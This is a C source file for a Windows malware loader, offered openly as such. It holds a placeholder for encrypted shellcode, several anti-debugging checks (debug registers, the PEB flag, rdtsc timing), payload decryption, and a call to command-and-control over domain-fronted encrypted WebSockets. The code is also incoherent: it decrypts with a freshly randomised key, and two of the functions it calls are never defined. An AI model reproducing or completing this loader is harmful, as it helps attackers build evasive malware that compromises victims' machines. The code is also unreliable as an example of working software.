#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <wincrypt.h>
#include <wininet.h>
#include <string.h>
#include <winternl.h>
#include <iphlpapi.h>
#include <psapi.h>
#include <openssl/aes.h>
#include <openssl/ssl.h>
#include <openssl/bio.h>
#include <openssl/err.h>
#include <intrin.h>
#include "chacha20.h" // Include ChaCha20 implementation

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "ntdll.lib")

// Define encrypted payload (placeholder)
unsigned char encryptedPayload[] = { /* ChaCha20 Encrypted Shellcode */ };
size_t payloadSize = sizeof(encryptedPayload);

// ChaCha20 Key for decryption (Dynamically Derived at Runtime)
unsigned char CHACHA20_KEY[32];
unsigned char CHACHA20_NONCE[12];

void generateDynamicKey() {
    HCRYPTPROV hProv;
    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
        fprintf(stderr, "[ERROR] Failed to acquire cryptographic context.\n");
        memset(CHACHA20_KEY, 0, sizeof(CHACHA20_KEY));
        memset(CHACHA20_NONCE, 0, sizeof(CHACHA20_NONCE));
        return;
    }
    
    if (!CryptGenRandom(hProv, sizeof(CHACHA20_KEY), CHACHA20_KEY)) {
        fprintf(stderr, "[ERROR] Failed to generate random key.\n");
        memset(CHACHA20_KEY, 0, sizeof(CHACHA20_KEY));
    }
    
    if (!CryptGenRandom(hProv, sizeof(CHACHA20_NONCE), CHACHA20_NONCE)) {
        fprintf(stderr, "[ERROR] Failed to generate random nonce.\n");
        memset(CHACHA20_NONCE, 0, sizeof(CHACHA20_NONCE));
    }
    
    CryptReleaseContext(hProv, 0);
}

// Anti-Debugging Techniques
bool isDebuggerPresent() {
    if (IsDebuggerPresent()) return true;
    
    CONTEXT ctx;
    memset(&ctx, 0, sizeof(CONTEXT));
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    HANDLE hThread = OpenThread(THREAD_GET_CONTEXT, FALSE, GetCurrentThreadId());
    if (hThread) {
        if (GetThreadContext(hThread, &ctx)) {
            if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3 || ctx.Dr6 || ctx.Dr7) {
                CloseHandle(hThread);
                return true;
            }
        }
        CloseHandle(hThread);
    }
    
    PROCESS_BASIC_INFORMATION pbi;
    NTSTATUS status = NtQueryInformationProcess(GetCurrentProcess(), 0, &pbi, sizeof(pbi), NULL);
    if (NT_SUCCESS(status) && pbi.PebBaseAddress->BeingDebugged) return true;
    
    ULONGLONG start = __rdtsc();
    Sleep(10 + (rand() % 10));
    int cpu_cycles_threshold = 8000 + (rand() % 4000); // More dynamic threshold
    if (__rdtsc() - start < cpu_cycles_threshold) return true;
    
    return false;
}

// Main function with enhanced stealth
int main() {
    if (isDebuggerPresent()) {
        return 0;
    }
    
    generateDynamicKey();
    decryptPayload(encryptedPayload, payloadSize);
    
    secureC2Comm(); // Communicate securely via encrypted WebSockets with domain fronting
    return 0;
}
